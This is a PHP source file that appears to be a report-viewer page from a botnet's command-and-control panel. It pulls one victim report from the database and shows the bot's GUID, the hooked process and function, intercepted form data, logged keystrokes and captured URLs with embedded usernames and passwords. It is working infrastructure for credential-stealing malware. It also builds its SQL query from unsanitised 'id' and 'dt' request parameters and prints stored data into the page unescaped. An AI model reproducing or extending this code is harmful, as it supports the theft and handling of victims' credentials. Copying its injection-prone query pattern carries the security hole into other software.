<?php

set_time_limit(0);

$id = $_GET['id'];
$dt = $_GET['dt'];

require_once 'mod_file.php';
require_once 'mod_dbase.php';
require_once 'mod_strenc.php';

$dbase = db_open();

$sql = "SELECT `bot_guid`, `date_rep`, `process_name`, `hooked_func`, `func_data`, `keys`, `url` FROM rep2_$dt WHERE id = $id LIMIT 1";
$res = mysqli_query($dbase, $sql);
if (!(@($res))) {
	writelog("error.log", "Wrong query : \" $sql \"");
	echo "<b>Wrong query</b> : \" $sql \"";
	db_close($dbase);
	exit;
}

if ( mysqli_num_rows($res) == 0) {
	echo "<b>Not found</b>";
	db_close($dbase);
	exit;
}

list($bot_guid, $date_rep, $process_name, $hooked_func, $func_data, $keys, $url) = mysqli_fetch_row($res);

$data = $func_data;

// readable stuff
$data = str_replace('&', "\n", $data);

$tmp = "<center>"
. "<table width='730' border='1' cellspacing='0' cellpadding='3' style='border: 1px solid #BBBBBB; font-size: 9px; border-collapse: collapse; background-color: #4992a7;'>"
. "<th style=' color: #EEEEEE;'>id</th>"
. "<th style=' color: #EEEEEE;'>bot</th>"
. "<th style=' color: #EEEEEE;'>bot_guid</th>"
. "<th style=' color: #EEEEEE;'>date_rep</th>"
. "<th style=' color: #EEEEEE;'>process_name</th>"
. "<th style=' color: #EEEEEE;'>hooked_func</th>"
. "<tr align='center' valign='middle' style=' background-color: #cce7ef; '>";

$arr = parse_url( $url );
if( $arr['user'] && $arr['pass'] ) $colon   = ':';
if( $arr['user'] || $arr['pass'] ) $at_sign = '@';
if( $arr['query'] ) $qmark = '?';

$ucodebot = urlencode($bot_guid);

$tmp .= "<td>$id</td>"
. "<td><a href='frm_bot.php?guid=$ucodebot' target='_blank'><img border='0' src='img/info.png'></a></td>"
. "<td>$bot_guid</td>"
. "<td>$date_rep</td>"
. "<td>$process_name</td>"
. "<td>$hooked_func</td>"
. "</tr>"
. "<td colspan='10' align='left' valign='middle' style=' background-color: #cce7ef; '>{$arr['scheme']}://<i>{$arr['user']}$colon{$arr['pass']}</i>$at_sign<b>{$arr['host']}</b>{$arr['path']}$qmark{$arr['query']}{$arr['fragment']}</td>"
. "</tr>"
. "<tr align='center' valign='middle'>"
. "<td colspan='10'>"
;

//$tmp .= "<textarea id='ta' onmouseover='this.style.backgroundColor = \"white\"; this.style.height = this.scrollHeight + \"px\";' onmouseout='this.style.backgroundColor=\"white\"; this.style.height = this.scrollHeight + \"px\";' style=' border-width: 1px; width: 730px; height: 500; background-color: \"white\"; color: #666666; ' readonly >";
$tmp .= "<textarea id='ta' style=' border-width: 1px; width: 730px; height: 500; background-color: \"white\"; color: #666666; ' readonly >";
if (strlen($url) && substr($data, 0, 4) != 'http')
	$data = $url . "\n\n" .  $data;
$tmp .= $data;

// displaying keys too
if (strlen($keys) != 0) {
	$keys = ucs2html($keys);
	$tmp .= "\n\nkeys: $keys";
}

$tmp .= "</textarea>"
. "</td>"
. "</tr>"
. "</table>"
. "</center>"
. "<script language='JavaScript'>var ta = document.getElementById('ta'); ta.style.height = ta.scrollHeight + 10 + \"px\";</script>"
;

$data = $tmp;

require_once 'frm_skelet.php';
echo get_skelet("log({$arr['host']}, {$arr['scheme']}, $date_rep)", $data, 'div_main');

db_close($dbase);

?>
